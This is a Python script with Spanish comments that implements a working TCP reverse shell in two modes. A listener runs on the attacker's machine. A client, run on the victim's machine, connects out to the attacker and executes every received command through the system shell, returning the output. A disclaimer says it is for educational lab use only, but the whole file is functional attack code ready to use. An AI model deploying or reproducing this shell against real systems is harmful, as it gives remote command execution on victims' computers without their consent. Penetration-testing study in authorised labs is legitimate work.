#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
reverse_shell.py - Reverse Shell TCP
------------------------------------
Este script implementa una reverse shell básica en Python con dos modos:
1. Listener (servidor) → se ejecuta en el atacante.
2. Cliente (reverse shell) → se ejecuta en la víctima.

Características:
- Comunicación TCP cliente-servidor.
- Ejecución remota de comandos desde el atacante.
- Interfaz sencilla con argumentos.
- Código comentado y seguro para entornos de laboratorio.

⚠️ Aviso legal:
Este script es únicamente para fines educativos en entornos
controlados. El uso contra sistemas de terceros sin autorización
es ilegal y contrario a la ética profesional.
"""

import socket
import subprocess
import argparse
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)


# ----------------------------
# Listener (modo atacante)
# ----------------------------
def start_listener(host: str, port: int):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"{Fore.GREEN}[+] Escuchando en {host}:{port}...")

    conn, addr = server.accept()
    print(f"{Fore.CYAN}[+] Conexión recibida desde {addr[0]}:{addr[1]}")

    while True:
        try:
            cmd = input(f"{Fore.YELLOW}Shell> {Style.RESET_ALL}")
            if cmd.lower() in ["exit", "quit"]:
                conn.send(b"exit")
                break

            conn.send(cmd.encode())
            output = conn.recv(4096).decode(errors="ignore")
            print(output)
        except KeyboardInterrupt:
            print("\n[!] Listener interrumpido por el usuario.")
            break

    conn.close()
    server.close()


# ----------------------------
# Cliente (modo víctima)
# ----------------------------
def start_client(target: str, port: int):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        print(f"{Fore.GREEN}[+] Conectado al atacante {target}:{port}")
    except Exception as e:
        print(f"{Fore.RED}[X] Error de conexión: {e}")
        return

    while True:
        try:
            cmd = client.recv(1024).decode(errors="ignore")
            if cmd.lower() == "exit":
                break

            # Ejecutar comando en la shell
            result = subprocess.getoutput(cmd)
            if not result:
                result = "[Sin salida]"
            client.send(result.encode())
        except Exception as e:
            client.send(f"[!] Error ejecutando comando: {e}".encode())
            break

    client.close()


# ----------------------------
# Argumentos
# ----------------------------
def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Reverse Shell en Python (uso educativo)"
    )
    parser.add_argument(
        "mode",
        choices=["listener", "client"],
        help="Modo de operación: listener (atacante) o client (víctima)",
    )
    parser.add_argument("host", help="Dirección IP del host atacante/listener")
    parser.add_argument("port", type=int, help="Puerto a utilizar")
    return parser.parse_args()


# ----------------------------
# Main
# ----------------------------
if __name__ == "__main__":
    args = parse_arguments()
    if args.mode == "listener":
        start_listener(args.host, args.port)
    elif args.mode == "client":
        start_client(args.host, args.port)
